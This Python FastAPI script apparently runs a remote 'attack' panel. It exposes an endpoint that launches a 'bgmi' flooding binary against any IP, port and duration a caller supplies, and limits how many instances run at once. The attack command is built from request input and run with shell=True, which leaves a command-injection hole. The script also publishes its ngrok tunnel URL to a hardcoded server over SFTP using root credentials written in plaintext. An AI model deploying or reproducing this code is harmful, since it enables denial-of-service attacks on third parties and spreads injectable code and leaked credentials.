from fastapi import FastAPI
import subprocess
import asyncio
import psutil
import requests
import os
import threading
import paramiko

app = FastAPI()

@app.get("/run-command")
async def run_command(ip: str, port: int, time: int):
    command = f"./bgmi {ip} {port} {time} 200"
    running_instances = 0

    for process in psutil.process_iter(['pid', 'name', 'cmdline']):
        if process.info['name'] == 'bgmi' or (process.info['cmdline'] and 'bgmi' in process.info['cmdline']):
            running_instances += 1

    if running_instances >= 14:
        output = "Maximum number of instances are already running"
        store_output(output)
        return {"error": True, "output": output}

    try:
        process = subprocess.Popen(command, shell=True)
        asyncio.create_task(stop_process_after_time(process, time))
        output = "Attack Started Successfully"
        store_output(output)
        return {"error": False, "output": output, "ip": ip, "port": port, "time": time}
    except Exception as e:
        output = f"Error starting attack: {str(e)}"
        store_output(output)
        return {"error": True, "output": output}

async def stop_process_after_time(process, time):
    await asyncio.sleep(time)
    process.terminate()
    store_output("Process terminated after time")

def store_output(output):
    with open('soul.txt', 'a') as file:
        file.write(output + "\n")

def get_ngrok_url():
    try:
        response = requests.get('http://localhost:4040/api/tunnels')
        response.raise_for_status()
        data = response.json()
        public_url = data['tunnels'][0]['public_url']
        update_soul_txt(public_url)
    except requests.exceptions.RequestException as e:
        error_message = f"Error retrieving ngrok URL: {e}"
        store_output(error_message)

def update_soul_txt(new_url):
    with open('soul.txt', 'r') as file:
        lines = file.readlines()

    with open('soul.txt', 'w') as file:
        for line in lines:
            if not line.startswith("http"):
                file.write(line)
        file.write(new_url + "\n")

    upload_to_vps()

def upload_to_vps():
    hostname = "194.238.17.134"
    username = "root"
    password = "SOULKINg@9080"
    local_path = "soul.txt"
    remote_path = "/root/soul/soul.txt"

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname, username=username, password=password)

    sftp = ssh.open_sftp()

    # Ensure remote directory exists
    remote_directory = os.path.dirname(remote_path)
    try:
        sftp.chdir(remote_directory)
    except IOError:
        sftp.mkdir(remote_directory)
        sftp.chdir(remote_directory)

    sftp.put(local_path, remote_path)
    sftp.close()
    ssh.close()

if __name__ == "__main__":
    import uvicorn

    def run_ngrok():
        os.system("ngrok http 8000")
        get_ngrok_url()

    threading.Thread(target=run_ngrok).start()
    asyncio.run(asyncio.sleep(5))
    get_ngrok_url()
    uvicorn.run(app, host="0.0.0.0", port=8000)
